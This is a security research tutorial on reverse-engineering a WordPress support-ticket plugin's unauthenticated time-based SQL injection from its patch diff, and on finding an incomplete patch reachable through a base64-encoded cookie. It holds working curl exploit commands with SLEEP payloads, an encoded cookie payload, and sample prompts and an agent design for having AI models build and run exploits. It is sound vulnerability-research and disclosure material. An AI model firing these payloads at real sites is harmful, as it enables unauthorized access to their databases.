# Reverse-cve

# Reverse Engineering WordPress SQLi: From Patch Diff to Incomplete Patch Discovery

## Table of Contents

- [TL;DR](#tldr)
- [Part 0x01: Vulnerability Research Fundamentals](#part-0x01-vulnerability-research-fundamentals)
- [Part 0x02: Traditional Manual Research](#part-0x02-traditional-manual-research)
- [Part 0x03: AI-Assisted Research](#part-0x03-ai-assisted-research)
- [Part 0x04: The Future of Autonomous Agents](#part-0x04-the-future-of-autonomous-agents)
- [Part 0x05: Side by Side Comparison](#part-0x05-side-by-side-comparison)

---

## TL;DR
As you all know that the cybersecurity landscape is evolving rapidly. What once took experienced researchers days or weeks to accomplish can now be done in hours with the right tools and methodologies. The rise of Large Language Models (LLMs) like Claude, Gemini, and others has fundamentally changed how we approach security research.

In this article, I will walk you through both the traditional and AI-assisted approaches to reverse engineering CVEs (Common Vulnerabilities and Exposures), using a real-world example that led to an interesting discovery: an incomplete security patch that left thousands of WordPress sites vulnerable.

Whether you're a beginner looking to enter the world of bug bounty hunting or an experienced researcher wanting to 10x your productivity, this guide is for you.

## Part 0x01: Vulnerability Research Fundamentals
Before we dive in, let's establish some fundamentals.
### What is Vulnerability Research?
Vulnerability research is the process of discovering, analyzing, and documenting security weaknesses in software. When a vulnerability is discovered and reported, it's assigned a CVE identifier: a unique reference number that helps track the issue across the security community.

**Reverse engineering a CVE** means taking a known vulnerability and:
* Understanding how it works technically
* Identifying the vulnerable code
* Creating a proof-of-concept (PoC) exploit
* Building detection mechanisms (like Nuclei templates)

### Why Would You Want to Do This?
* **For Bug Bounty Hunting:** Many programs pay for working PoCs, even for known CVEs
* **For Security Research:** Understanding vulnerabilities makes you a better defender
* **For Penetration Testing:** You need reliable exploits to test client systems
* **For Learning:** There's no better way to understand security than hands-on research
* **Template Creation:** Contributing detection templates to open-source projects
* **For Catching Incomplete Patches:** This is the hidden gem. Vendors sometimes fix one code path and miss another. Thorough research catches this.

### The Three Eras of Vulnerability Research

According me, these three distinct approaches to do the same research task:
| Era                          | Time Required       | Human Effort          |
|------------------------------|---------------------|-----------------------|
| **Era 1: Traditional Manual**    | 8–24 hours         | 100%                 |
| **Era 2: AI-Assisted**           | ~60 minutes        | ~20%                 |
| **Era 3: Autonomous Agents**     | ~10 minutes        | ~5% (Verification)   |

Each era builds on the previous one. You need to understand the manual process before AI assistance makes sense. Otherwise, you are just running commands you don't understand.

---

## Part 0x02: Traditional Manual Research

### The Traditional Approach (Without AI)
Let me first show you how vulnerability research has been done for decades. This approach requires deep technical knowledge, patience, and significant time investment.

### Tools You Need
Before running a single command, make sure you have these ready:
| Tool | Purpose | Free/Paid | Alternative |
|---|---|---|---|
| `diff` / `meld` | Compare file versions | Free (built-in / GUI) | `vimdiff`, `delta` |
| `grep` / `ripgrep` | Search through code | Free | `ag` (silver searcher) |
| `sed` | View specific line ranges | Free (built-in) | `bat` (with line numbers) |
| `curl` | Send HTTP requests | Free (built-in) | `httpie`, Burp Suite |
| `Docker` | Isolated lab environment | Free (Docker Desktop) | VirtualBox + VM |
| `Burp Suite` | Intercept and modify requests | Free (Community) / Paid (Pro) | Caido |
| `VSCode` / `vim` | Read source code | Free | any editor |
| `Claude` | AI research assistant | Free / Pro $20/mo | Gemini |
| `sqlmap` | SQLi automation | Free | Ghauri |

### Step 1: Gather Intelligence

Don't start with the code. Start with what's already documented. Before touching any files, read everything available about the CVE.

```bash
# Key sources to check for any WordPress CVE:
# - https://nvd.nist.gov/vuln/detail/CVE-20XX-XXXX
# - https://www.wordfence.com/threat-intel/vulnerabilities/
# - https://patchstack.com/database/vulnerability/<slug>/
# - https://plugins.trac.wordpress.org/log/<slug>/
```

From Wordfence for this CVE, the key facts are:

- **Vulnerable parameter:** `email` and `ticketid`
- **Type:** Time-based blind SQL injection
- **Root cause:** Direct string concatenation in SQL queries in `modules/ticket/model.php`
- **No authentication required**

**The important root cause note is:** direct string concatenation means user input is glued directly into a SQL query with no protection. This is the classic SQLi pattern.

### Step 2: Set Up Your Lab

Never test on production systems. Spin up an isolated environment.

```bash
# Minimal WordPress + MySQL lab with Docker
docker run -d \
  --name mysql-lab \
  -e MYSQL_ROOT_PASSWORD=rootpass \
  -e MYSQL_DATABASE=wordpress \
  -e MYSQL_USER=wpuser \
  -e MYSQL_PASSWORD=wppass \
  mysql:5.7

docker run -d \
  --name wordpress-lab \
  --link mysql-lab:mysql \
  -p 8080:80 \
  -e WORDPRESS_DB_HOST=mysql \
  -e WORDPRESS_DB_USER=wpuser \
  -e WORDPRESS_DB_PASSWORD=wppass \
  wordpress:latest
```

After setup, access `http://localhost:8080`, complete the WordPress install, then install the vulnerable plugin.

### Step 3: Download Both Versions

The diff between **vulnerable** and **patched** versions is the vulnerability map. The patch tells you exactly where to look.

```bash
# Download vulnerable version (2.8.1) and patched version (2.8.2)
wget "https://downloads.wordpress.org/plugin/<slug>.2.8.1.zip" -O v281.zip
wget "https://downloads.wordpress.org/plugin/<slug>.2.8.2.zip" -O v282.zip

# Extract both
unzip v281.zip -d vulnerable/
unzip v282.zip -d patched/
```

### Step 4: Run the Diff

```bash
# First pass: see ALL changed files
diff -rq vulnerable/<slug> patched/<slug>
```

Output:
```
Files vulnerable/.../activation.php and patched/.../activation.php differ
Only in patched/.../includes/updates/sql: 282.sql
Files vulnerable/.../main.php and patched/.../main.php differ
Files vulnerable/.../modules/controller.php and patched/.../controller.php differ
Files vulnerable/.../modules/ticket/model.php and patched/.../model.php differ   ← THIS
Files vulnerable/.../readme.txt and patched/.../readme.txt differ
```

What each changed file usually means for security research:

```
readme.txt            → Changelog only. Usually safe to skip.
main.php → Version bump. Usually safe to skip.
activation.php        → DB schema changes. Relevant if SQLi fixed via schema.
controller.php        → Input handling. Check for auth fixes or input validation.
model.php             → Database queries. THIS is where SQL injection lives.
*.sql files           → Schema migration. Might harden DB structure.
```

In an MVC-oriented WordPress plugin's, SQL queries are constructed in the Model layer. SQL Injection is fundamentally a query construction flaw. Therefore, the vulnerability and its fix were expected to reside in model.php. This significantly narrowed the attack surface during diff analysis. In Short, **Model = database. SQLi fix = model.php.** You don't need to guess.

### Step 5: Diff the Target File

```bash
# Deep dive into the model that changed
diff -u vulnerable/<slug>/modules/ticket/model.php \
        patched/<slug>/modules/ticket/model.php
```

The critical section of the diff output:

```diff
@@ -2279,6 +2279,9 @@
         if($emailaddress == '' && $trackingid == ''){
             return false;
+        } else{
+            $emailaddress = sanitize_email($emailaddress);
+            $trackingid = sanitize_email($trackingid);
         }
         $query = "SELECT id FROM `" . support::$_db->prefix . "function`
                   WHERE email = '" . $emailaddress . "' AND ticketid = '" . $trackingid . "'";
```

The patch added `sanitize_email()` calls before the variables are used in the SQL query.

> **Important technical note:** `sanitize_email()` strips characters like `'`, `"`, `;`, `<`, `>` from the input. This *happens* to break SQL injection payloads in this case. But it is **not** the correct fix for SQL injection. The correct fix is `$wpdb->prepare()` with parameterized queries. The patch is a lucky sanitization that works here, not a proper parameterized query. This distinction matters for writing accurate reports and for understanding why similar patterns in the same codebase might still be vulnerable even after patching.

### Step 6: Confirm the Vulnerable Code

```bash
# View the exact vulnerable lines in the old version
sed -n '2278,2290p' vulnerable/<slug>/modules/ticket/model.php
```

Output:
```php
if($emailaddress == '' && $trackingid == ''){
    return false;
}
$query = "SELECT id FROM `" . support::$_db->prefix . "function`
          WHERE email = '" . $emailaddress . "'
          AND ticketid = '" . $trackingid . "'";
$ticketid = support::$_db->get_var($query);
return $ticketid;
```

This is textbook SQL injection. The values `$emailaddress` and `$trackingid` are dropped directly into the query string inside single quotes. An attacker breaks out with `'` and injects arbitrary SQL.

```
Normal query:
  WHERE email = 'user@example.com' AND ticketid = 'TICKET123'

Injected query:
  WHERE email = 'user@example.com' AND ticketid = '' OR SLEEP(5)-- -'
```

### Step 7: Find the Function Name

```bash
# Which function contains this vulnerable query?
grep -n "function" vulnerable/<slug>/modules/ticket/model.php | grep -A1 -B1 "2262\|2288"
```

The vulnerable function is `getTicketidForVisitor($token)`. Note that it takes a `$token` parameter not `email`/`ticketid` directly. This is a key observation. The token contains encoded JSON, which is decoded inside the function before the SQL runs. The attack path goes through token encoding.

### Step 8: Trace the Attack Path

Work backwards from the function to the HTTP entry point.

```bash
# Who calls getTicketidForVisitor?
grep -rn "getTicketidForVisitor" vulnerable/<slug>/
```

Output:
```
modules/ticket/model.php:2262:    function getTicketidForVisitor($token)
modules/ticket/controller.php:399:    $ticketid = JSSTincluder::getJSModel('ticket')->getTicketidForVisitor($token);
```

```bash
# What does the controller do around line 399?
sed -n '360,420p' vulnerable/<slug>/modules/ticket/controller.php
```

The controller code reveals the full logic:

```php
static function showticketstatus() {
    $nonce = JSSTrequest::getVar('_wpnonce');
    if (! wp_verify_nonce( $nonce, 'show-ticket-status') ) {
        // NOTE: nonce check is commented out — no CSRF protection!
        //die( 'Security check Failed' );
    }
    $token = JSSTrequest::getVar('token');
    if ($token == null) {
        // If no token provided, accept raw email + ticketid from POST
        $emailaddress = JSSTrequest::getVar('email');
        $trackingid   = JSSTrequest::getVar('ticketid');
        $token = JSSTincluder::getJSModel('ticket')
                   ->createTokenByEmailAndTrackingId($emailaddress, $trackingid);
    }
    // Token (containing our payload) gets saved to cookie
    supportphplib::JSST_setcookie('support-token-tkstatus', $token, 0, COOKIEPATH);

    // Then passed to the vulnerable function
    $ticketid = JSSTincluder::getJSModel('ticket')->getTicketidForVisitor($token);
}
```

This is the full attack path:

```
HTTP POST Request
       ↓
  formhandler.php  (checks form_request=support → routes to ticket controller)
       ↓
  JSSTticketController::showticketstatus()  (triggered by task=showticketstatus)
       ↓
  createTokenByEmailAndTrackingId($email, $ticketid)  (encodes your input into token)
       ↓
  getTicketidForVisitor($token)  (decodes token, passes to SQL with no protection)
       ↓
  MySQL  (executes your injected SQL)
```

```bash
# Verify how the router works
grep -n "form_request\|jstmod\|task" vulnerable/<slug>/includes/formhandler.php | head -20
```

The formhandler checks for `form_request=support`, then reads `jstmod` to pick the module and `task` to pick the method to call.

### Step 9: Build and Verify the Exploit

You now have everything needed to build the HTTP request.

```bash
# Time-based blind SQLi verification
# If response takes ~5 seconds, the injection worked
curl -X POST "http://TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_request=support" \
  -d "jstmod=ticket" \
  -d "task=showticketstatus" \
  -d "email=test@test.com' AND SLEEP(5)-- -" \
  -d "ticketid=test123" \
  -o /dev/null -w "Response time: %{time_total}s\n"
```

Verify with multiple values to confirm the timing is controlled by your payload:

```bash
# Control test — should be fast (~0.3s)
curl -X POST "http://TARGET/" \
  -d "form_request=support&jstmod=ticket&task=showticketstatus" \
  -d "email=test@test.com' AND SLEEP(0)-- -&ticketid=test" \
  -o /dev/null -w "SLEEP(0): %{time_total}s\n"

# 3-second delay
curl -X POST "http://TARGET/" \
  -d "form_request=support&jstmod=ticket&task=showticketstatus" \
  -d "email=test@test.com' AND SLEEP(3)-- -&ticketid=test" \
  -o /dev/null -w "SLEEP(3): %{time_total}s\n"

# 5-second delay
curl -X POST "http://TARGET/" \
  -d "form_request=support&jstmod=ticket&task=showticketstatus" \
  -d "email=test@test.com' AND SLEEP(5)-- -&ticketid=test" \
  -o /dev/null -w "SLEEP(5): %{time_total}s\n"
```

If timing scales with the SLEEP value, SQLi is confirmed.

### Step 10: Search for Similar Patterns (The Step Most People Skip)

This is where the incomplete patch hides. After confirming the first vulnerability, always search for similar patterns in the same codebase.

```bash
# Search for ALL direct SQL concatenation with user-controlled variables
grep -n "SELECT.*WHERE.*email\|SELECT.*WHERE.*trackingid" \
  vulnerable/<slug>/modules/ticket/model.php
```

Output reveals **two** vulnerable queries:

```
Line 2283: $query = "SELECT id FROM ... WHERE email = '" . $emailaddress . "' ...
Line 2361: $query = "SELECT id FROM ... WHERE email = '" . $emailaddress . "' ...
```

Two functions, same vulnerable pattern. Check if the patch fixed both:

```bash
# Check what the patch actually fixed
diff -u vulnerable/<slug>/modules/ticket/model.php \
        patched/<slug>/modules/ticket/model.php | grep "^[+-]" | grep -v "^---\|^+++"
```

The patch only sanitized the inputs in `getTicketidForVisitor()` at line ~2279. It never touched `validateTicketDetailForVisitor()` at line ~2358.

### The Incomplete Patch Discovery

```bash
# View the second vulnerable function in the patched version
sed -n '2355,2370p' patched/<slug>/modules/ticket/model.php
```

```php
// In patched version 2.8.2 — this is STILL vulnerable
function validateTicketDetailForVisitor($token) {
    $array = json_decode(supportphplib::JSST_decrypt($token), true);
    $emailaddress = $array['emailaddress'];
    $trackingid   = $array['trackingid'];
    // No sanitize_email() here — patch missed this function entirely
    $query = "SELECT id FROM `" . support::$_db->prefix . "function`
              WHERE email = '" . $emailaddress . "' AND ticketid = '" . $trackingid . "'";
```

The second function reads from a **cookie** instead of POST parameters. This means:

1. Version 2.8.2 is still exploitable
2. The attack vector changed: from POST body to cookie
3. The cookie contains Base64-encoded JSON

```bash
# Build the cookie-based payload for 2.8.2
# Create malicious JSON with SQLi in emailaddress field
PAYLOAD='{"emailaddress":"test@test.com'\'' AND SLEEP(10)-- -","trackingid":"test123"}'

# Base64 encode it
echo -n "$PAYLOAD" | base64
# eyJlbWFpbGFkZHJlc3MiOiJ0ZXN0QHRlc3QuY29tJyBBTkQgU0xFRVAoMTApLS0gLSIsInRyYWNraW5naWQiOiJ0ZXN0MTIzIn0=

# Send the exploit against version 2.8.2
curl "http://TARGET/support-controlpanel/?jstmod=ticket&jstlay=ticketdetail&supportticketid=1" \
  -H "Cookie: support-ticket-token-tkstatus=eyJlbWFpbGFkZHJlc3MiOiJ0ZXN0QHRlc3QuY29tJyBBTkQgU0xFRVAoMTApLS0gLSIsInRyYWNraW5naWQiOiJ0ZXN0MTIzIn0=" \
  -o /dev/null -w "Response time: %{time_total}s\n"
```

A **~10 second** response time confirms version 2.8.2 is still **vulnerable**.

> **Important Note:** This incomplete patch was later assigned **CVE-2023-7337**. While version 2.8.2 fixed the `getTicketidForVisitor()` function, it missed the `validateTicketDetailForVisitor()` function (which relied on cookie-based input), leaving thousands of sites still vulnerable.

### Vulnerability Matrix

| Version | `getTicketidForVisitor()` | `validateTicketDetailForVisitor()` |
|---|---|---|
| ≤ 2.8.1 | ❌ Vulnerable | ❌ Vulnerable |
| 2.8.2 | ✅ Fixed | ❌ Still Vulnerable |
| ≥ 2.8.3 | ✅ Fixed | ✅ Fixed |

### Time Breakdown (Traditional Manual Approach)

| Phase | Time |
|---|---|
| Intelligence gathering | 30–60 min |
| Lab setup | 30–60 min |
| Downloading and diffing | 20–30 min |
| Code analysis and function tracing | 2–8 hours |
| Exploit building and testing | 1–3 hours |
| Searching for similar patterns | 30–60 min |
| Documentation | 1–2 hours |
| **Total** | **6–15 hours** |

---

## Part 0x03: AI-Assisted Research

### The Shift in Workflow

The AI-assisted approach doesn't skip any of the steps above. It compresses them. You still need to understand what you are looking at, because the AI handles execution, **not judgment**.

The right mental model: **you are the researcher, the AI is the very fast junior analyst who can read thousands of lines of code in seconds.**

Tools used:

| Tool | Role | Free/Paid |
|---|---|---|
| Claude (Anthropic) | AI assistant + computer use | Free tier / Pro ($20/mo) |
| ChatGPT-4 | Alternative AI assistant | Free tier / Plus ($20/mo) |
| Nuclei | Template scanning | Free (open source) |
| Docker | Lab environment | Free |

### The Conversation (Actual Workflow)

**Step 1: Initial recon (2 min)**

```
You: "I want to reverse engineer CVE-20XX-XXXX in the WordPress plugin.
      Summarize the vulnerability, affected versions, and CVSS score from public sources."

Claude: [searches NVD + Wordfence]
        "CVE-20XX-XXXX — Unauthenticated time-based blind SQLi in Test Plugin ≤2.8.1.
         CVSS 9.8 Critical. Vulnerable parameters: email and ticketid via POST.
         Fixed in 2.8.2. Wordfence reference: [link]"
```

**Step 2: Download and diff (3 min)**

```
You: "Download versions 2.8.1 and 2.8.2 of test plugin from WordPress.org,
      extract both, and show me only the security-relevant changes."

Claude: [executes commands]
        wget https://downloads.wordpress.org/plugin/<slug>.2.8.1.zip
        wget https://downloads.wordpress.org/plugin/<slug>.2.8.2.zip
        unzip ... && diff -u ...

        "Security fix found in modules/ticket/model.php at lines 2282–2284.
         Patch added sanitize_email() to $emailaddress and $trackingid before
         they're used in the SQL query inside getTicketidForVisitor()."
```

**Step 3: Code flow analysis (5 min)**

```
You: "Trace exactly how user input from an HTTP request reaches getTicketidForVisitor().
      Map the full attack path from entry point to SQL execution."

Claude: [reads formhandler.php, controller.php, model.php]
        "Full attack path:
         1. POST with form_request=support triggers formhandler.php
         2. jstmod=ticket loads JSSTticketController
         3. task=showticketstatus calls showticketstatus()
         4. email + ticketid from POST → createTokenByEmailAndTrackingId()
         5. Token saved to cookie, then passed to getTicketidForVisitor()
         6. Token decoded → values concatenated into SQL query
         Required params: form_request, jstmod, task, email, ticketid"
```

**Step 4: Build and test exploit (3 min)**

```
You: "Create a curl command to test time-based SQLi on the email parameter.
      Test it against my lab at http://YOUR-LAB-IP/"

Claude: [generates command, executes it, measures response]
        curl -X POST "http://YOUR-LAB-IP/" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          -d "form_request=support&jstmod=ticket&task=showticketstatus" \
          -d "email=test@test.com' AND SLEEP(5)-- -&ticketid=test"

        "Response time: 5.42 seconds — CONFIRMED VULNERABLE ✅
         SLEEP(0): 0.38s | SLEEP(3): 3.26s | SLEEP(5): 5.42s"
```

**Step 5: Hunt for similar patterns (5 min)**

```
You: "Search the entire codebase for other functions that have the same
      direct SQL concatenation pattern with user-controlled email or trackingid."

Claude: [scans all model.php files]
        "⚠️  Found second vulnerable function!
         File: modules/ticket/model.php
         Function: validateTicketDetailForVisitor()
         Line: 2361
         Same pattern — $emailaddress and $trackingid concatenated directly.
         Checking 2.8.2 patch... NOT fixed. This function was missed."
```

**Step 6: Verify the incomplete fix (5 min)**

```
You: "Build the cookie-based exploit for validateTicketDetailForVisitor()
     and verify that version 2.8.2 is still vulnerable."

Claude: [builds base64 payload, constructs cookie-based curl command, executes it]
        Cookie: support-ticket-token-tkstatus=eyJlbWFpbGFkZHJlc3Mi...
        Response time: 10.82 seconds — VERSION 2.8.2 STILL VULNERABLE ✅
        "Incomplete fix confirmed. Vendor should be notified."
```

### AI-Assisted Time Breakdown

| Phase | Manual | AI-Assisted |
|---|---|---|
| Intelligence gathering | 30–60 min | 2 min |
| Lab setup | 30–60 min | 10 min |
| Download and diff | 20–30 min | 3 min |
| Code analysis | 2–8 hours | 5 min |
| Exploit development | 1–3 hours | 3 min |
| Pattern search | 30–60 min | 5 min |
| Incomplete fix verification | 30 min | 5 min |
| Documentation + Nuclei template | 1–2 hours | 15 min |
| **Total** | **6–15 hours** | **~48 min** |

### What AI Does Well vs. What It Doesn't

| AI Does Well | AI Struggles With |
|---|---|
| Pattern recognition in large codebases | Finding zero-days (novel unknowns) |
| Explaining complex code in plain English | Verifying exploits without tool access |
| Generating payloads from query structure | Understanding business context |
| Searching for similar patterns across files | Judgment calls on risk and ethics |
| Writing Nuclei templates and documentation | Novel vulnerability classes it hasn't seen |

The sweet spot is **human direction + AI execution**. You decide *what* to research. The AI does the reading, running, and drafting.

### Prompting Tips for Security Research

These prompt patterns consistently work well with Claude and GPT-4:

```
"I'm reverse engineering CVE-XXXX. Here's the diff. What was the exact vulnerability
and how would you exploit it?"

"Search this codebase for any other function that has the same pattern as
[paste vulnerable snippet]. Check if the patch missed any."

"Trace how [parameter name] from an HTTP request reaches [function name].
Map every hop through the code."

"Build a time-based SQLi curl payload for this query structure: [paste query].
Then test it against [URL]."
```

---

## Part 0x04: The Future of Autonomous Agents

### Where This Is Heading

The AI-assisted workflow still requires you to ask each question, review each result, and decide the next step. The next era removes that friction. Autonomous AI agents will handle the full pipeline from monitoring CVE feeds to pushing a working Nuclei template to GitHub, with humans approving at key decision points.

```
┌───────────────────────────────────────────────────────────┐
│                  AUTONOMOUS CVE AGENT                     │
├───────────────────────────────────────────────────────────┤
│                                                           │
│  [AUTO]  Monitor NVD / Wordfence for new CVEs             │
│          Filter by your tech stack (WordPress, PHP, etc.) │
│          Prioritize by CVSS score                         │
│             ↓                                             │
│  [AUTO]  Spin up isolated Docker lab                      │
│          Install exact vulnerable version                 │
│          Seed test database                               │
│             ↓                                             │
│  [AUTO]  Download both versions                           │
│          Run diff                                         │
│          Identify security-relevant changes               │
│             ↓                                             │
│  [AUTO]  Trace attack path through codebase               │
│          Build call graph from user input to SQL sink     │
│          Check for similar patterns (incomplete patches)  │
│             ↓                                             │
│  [AUTO]  Generate payloads                                │
│          Test against lab                                 │
│          Confirm timing correlation                       │
│             ↓                                             │
│  [AUTO]  Generate Nuclei template                         │
│          Write research writeup                           │
│          Prepare responsible disclosure report            │
│             ↓                                             │
│  [YOU]   "Exploit verified. Push to GitHub? [Y/N]"        │
│             ↓                                             │
│  [AUTO]  Create repo, push template, notify vendor        │
│                                                           │
└───────────────────────────────────────────────────────────┘
```

### What Makes This Possible

**MCP (Model Context Protocol):** A standard protocol that lets AI models connect to external tools such as file systems, browsers, APIs, and terminals in a structured way. Claude, for example, can run bash commands, read files, and make HTTP requests through MCP servers. This is what makes the "AI runs the diff" step possible today, and what enables autonomous pipelines tomorrow.

**Persistent memory across sessions:** Current AI assistants start fresh each conversation. Future agents will remember your research history, your tool preferences, your previous findings.

**Multi-agent collaboration:** Multiple specialized agents working in parallel. One scans CVE feeds. Another handles code analysis. Another manages lab environments. A coordinator stitches results together.

### Current State (2025–2026)

| Capability | Status | Tools |
|---|---|---|
| CVE monitoring | ✅ Available now | Feedly, custom NVD scripts, Wordfence API |
| Lab automation | ✅ Available now | Docker, Terraform, Vagrant |
| Code analysis | 🟡 AI-assisted | Claude + computer use, GPT-4 + Code Interpreter |
| Exploit generation | 🟡 AI-assisted | Human verification still required |
| Template creation | ✅ Available now | AI-generated, human-refined |
| Full autonomous pipeline | 🔴 Not yet | Early prototypes exist |

### Minimal Agent Architecture (Python Pseudocode)

```python
import asyncio
from anthropic import Anthropic
from docker import DockerClient

class CVEResearchAgent:
    def __init__(self):
        self.llm = Anthropic()
        self.docker = DockerClient()

    async def research(self, cve_id: str):
        # Step 1: Gather intel
        cve_data = await self.gather_intelligence(cve_id)

        # Step 2: Spin up lab
        container = await self.docker.create_container(
            image="wordpress:latest",
            plugin=cve_data["plugin"],
            version=cve_data["vulnerable_version"]
        )

        # Step 3: Analyze patch
        diff = await self.analyze_diff(
            cve_data["vulnerable_version"],
            cve_data["patched_version"]
        )

        # Step 4: Generate and test exploit
        exploit = await self.llm_generate_exploit(diff, cve_data)
        result = await self.test_exploit(container, exploit)

        # Step 5: Document findings
        template = await self.generate_nuclei_template(cve_data, exploit)

        # Step 6: Human approval gate
        approved = await self.request_human_approval(cve_data, result, template)
        if approved:
            await self.publish(cve_id, template)

    async def gather_intelligence(self, cve_id):
        # Query NVD API, Wordfence API, Patchstack
        # Return structured CVE data
        pass
```

### Your Role Evolves, Not Disappears

| Role | Manual Era | AI-Assisted | Autonomous Era |
|---|---|---|---|
| Intel gathering | You research | You ask AI | Agent monitors |
| Lab setup | You run commands | AI runs commands | Agent spins up |
| Code analysis | You read code | AI explains | Agent maps automatically |
| Exploit development | You craft payloads | AI suggests, you verify | Agent generates and verifies |
| Documentation | You write | AI drafts | Agent generates |
| **Your actual job** | **Do everything** | **Direct and verify** | **Set priorities, approve, handle ethics** |

The future isn't AI replacing security researchers. It's AI handling the mechanical labor so researchers can focus on novel discovery, vendor relationships, responsible disclosure decisions, and the creative parts of the job.

---

## Part 0x05: Side by Side Comparison

### Speed Comparison

```
Task                      Manual      AI-Assisted   Future Agent
────────────────────────────────────────────────────────────────
CVE monitoring            You check   You ask       Background 24/7
Intel gathering           30–60 min   2 min         ~0 min
Lab setup                 30–60 min   10 min        2 min
Download + diff           20–30 min   3 min         1 min
Code analysis             2–8 hours   5 min         2 min
Exploit development       1–3 hours   3 min         3 min
Pattern search            30–60 min   5 min         1 min
Documentation             1–2 hours   15 min        5 min
────────────────────────────────────────────────────────────────
Total                     6–15 hours  ~48 min       ~15 min
Your effort               100%        ~20%          ~5%
```

### Quality Comparison

More speed doesn't always mean less quality. For this specific research:

| Metric | Manual | AI-Assisted |
|---|---|---|
| Incomplete patch discovery | Often missed (time pressure) | Found (AI checked all patterns) |
| Accuracy of code analysis | High (if you're experienced) | High (AI doesn't get tired) |
| Exploit reliability | High (manual testing) | High (tested in lab) |
| Documentation quality | Variable | Consistent |
| False positives | Low | Low |

The incomplete patch was found in the AI-assisted run specifically because the AI was asked **"check for similar patterns"** a step that gets skipped manually when you are 8 hours into research and already have a confirmed PoC.

### When to Use Each Approach

**Use traditional manual research when:**
- You are learning a new vulnerability class
- The CVE is highly novel and AI might not have seen the pattern
- You need to understand every detail for a client report

**Use AI-assisted research when:**
- You are doing high-volume CVE research
- The codebase is large and complex
- You need to search for incomplete patches
- Time is a constraint

**Use autonomous agents when (once available):**
- Continuous monitoring of your tech stack
- Initial triage of high-volume CVE feeds
- Batch template generation across hundreds of CVEs

---
**Note:** *Frame exploits as defensive research.* Your PoC exists to verify the bug and build detection templates, not as a ready-to-fire attack tool for production systems.

**Author: Shivam Kamboj | [Twitter/X](https://twitter.com/sechunt3r) | [GitHub](https://github.com/sechunt3r) | [Linkedin](https://www.linkedin.com/in/sechunt3r)**

**Tags:**  `WordPress`, `SQL Injection`, `SQLi`, `CVE-2023-50839`, `CVE-2023-7337`, `Reverse Engineering`, `Incomplete Patch`, `Vulnerability Research`, `Bug Bounty`, `AI-Assisted Research`, `Security Research`, `Security`, `Research`, `AI`, `Web2`
